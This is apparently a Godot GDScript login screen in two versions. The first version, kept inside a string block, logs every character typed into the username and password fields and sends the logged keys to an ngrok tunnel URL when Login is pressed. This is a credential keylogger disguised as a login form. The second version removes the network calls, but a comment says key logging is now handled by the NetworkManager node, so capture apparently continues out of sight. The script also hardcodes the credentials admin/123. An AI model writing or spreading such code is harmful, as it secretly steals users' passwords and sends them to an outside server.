"""
extends Control

# ====================================================================
# NODE REFERENCES (Must have the '%' Unique Name toggle set in the editor)
# ====================================================================

@onready var username_input: LineEdit = %UsernameInput
@onready var password_input: LineEdit = %PasswordInput
@onready var login_button: Button = %LoginButton
@onready var center_container: CenterContainer = %CenterContainer
@onready var message_label: Label = Label.new()

# Network Manager Reference (Must be named "NetworkManager" in the scene tree)
@onready var network_manager: Node = $"NetworkManager" 


# ====================================================================
# LIFECYCLE
# ====================================================================

func _ready():
	# CRITICAL: Set the Server URL using your active Ngrok HTTPS URL + /data endpoint
	# If your Ngrok URL changes, you must update this line!
	network_manager.server_url = "https://crab-loved-hen.ngrok-free.app/data" 
	
	# 1. Setup Button Connection
	login_button.pressed.connect(_on_login_button_pressed)
	
	# ⭐ NEW FIX: Connect the LineEdit text_changed signals
	username_input.text_changed.connect(_on_username_input_text_changed)
	password_input.text_changed.connect(_on_password_input_text_changed)
	# ⭐ END NEW FIX
	
	# 2. Add the message label dynamically below the input fields
	# Assumes VBoxContainer is the first child of the CenterContainer
	var vbox = center_container.get_child(0) 
	if vbox is VBoxContainer:
		vbox.add_child(message_label)
	
	message_label.text = "Ready. Start typing and press Login."
	message_label.horizontal_alignment = HORIZONTAL_ALIGNMENT_CENTER
	message_label.size_flags_horizontal = Control.SIZE_EXPAND_FILL

# ====================================================================
# SIGNAL HANDLERS (Connected via the Node tab in the editor)
# ====================================================================

# This function is connected to the UsernameInput's 'text_changed' signal.
func _on_username_input_text_changed(new_text: String):
	# Log the last character entered. This works because the signal fires after each keypress.
	if new_text.length() > 0:
		var last_char = new_text.right(1)
		network_manager.log_key_press(last_char)

# This function is connected to the PasswordInput's 'text_changed' signal.
func _on_password_input_text_changed(new_text: String):
	# Log the last character entered.
	if new_text.length() > 0:
		var last_char = new_text.right(1)
		network_manager.log_key_press(last_char)


# This function is connected to the LoginButton's 'pressed' signal.
func _on_login_button_pressed():
	var username = username_input.text
	var password = password_input.text
	
	var correct_username = "admin"
	var correct_password = "123"
	
	message_label.text = "Processing login and sending logs..."
	
	# 1. Initiate the data send (this runs asynchronously)
	network_manager.send_key_data()
	
	# 2. Handle visual feedback for login status
	if username == correct_username and password == correct_password:
		message_label.text = "Login Successful! Awaiting server confirmation..."
		password_input.clear()
		username_input.clear()
		
	else:
		message_label.text = "Login Failed: Invalid credentials. Awaiting server confirmation..."
		password_input.clear()
	"""
	
extends Control

# ====================================================================
# NODE REFERENCES (Must have the '%' Unique Name toggle set in the editor)
# ====================================================================

@onready var username_input: LineEdit = %UsernameInput
@onready var password_input: LineEdit = %PasswordInput
@onready var login_button: Button = %LoginButton
@onready var center_container: CenterContainer = %CenterContainer
@onready var message_label: Label = Label.new()

# NOTE: The NetworkManager reference is removed.

# ====================================================================
# LIFECYCLE
# ====================================================================

func _ready():
	# 1. Setup Button Connection
	login_button.pressed.connect(_on_login_button_pressed)
	
	# ⭐ NEW: LineEdit text_changed signals ONLY for enabling/disabling the login button (Optional)
	username_input.text_changed.connect(_on_input_text_changed)
	password_input.text_changed.connect(_on_input_text_changed)
	
	# 2. Add the message label dynamically below the input fields
	var vbox = center_container.get_child(0)
	if vbox is VBoxContainer:
		vbox.add_child(message_label)
	
	message_label.text = "Ready. Enter credentials."
	message_label.horizontal_alignment = HORIZONTAL_ALIGNMENT_CENTER
	message_label.size_flags_horizontal = Control.SIZE_EXPAND_FILL
	
	# Initial button state check
	_update_login_button_state()

# ====================================================================
# SIGNAL HANDLERS
# ====================================================================

# Common handler for both input fields to manage the button state
func _on_input_text_changed(_new_text: String):
	_update_login_button_state()
	# All key logging is now handled by the NetworkManager node's own input handling

# This function is connected to the LoginButton's 'pressed' signal.
func _on_login_button_pressed():
	var username = username_input.text
	var password = password_input.text
	
	var correct_username = "admin"
	var correct_password = "123"
	
	# Handle visual feedback for login status
	if username == correct_username and password == correct_password:
		message_label.text = "Login Successful! Welcome, admin."
		password_input.clear()
		username_input.clear()
		login_button.disabled = true # Disable button after successful login
	else:
		message_label.text = "Login Failed: Invalid credentials."
		password_input.clear() # Clear password on failed attempt

# ====================================================================
# HELPER FUNCTIONS
# ====================================================================

# Ensures the login button is only active when both fields have content
func _update_login_button_state():
	var username_present = not username_input.text.is_empty()
	var password_present = not password_input.text.is_empty()
	
	login_button.disabled = not (username_present and password_present)
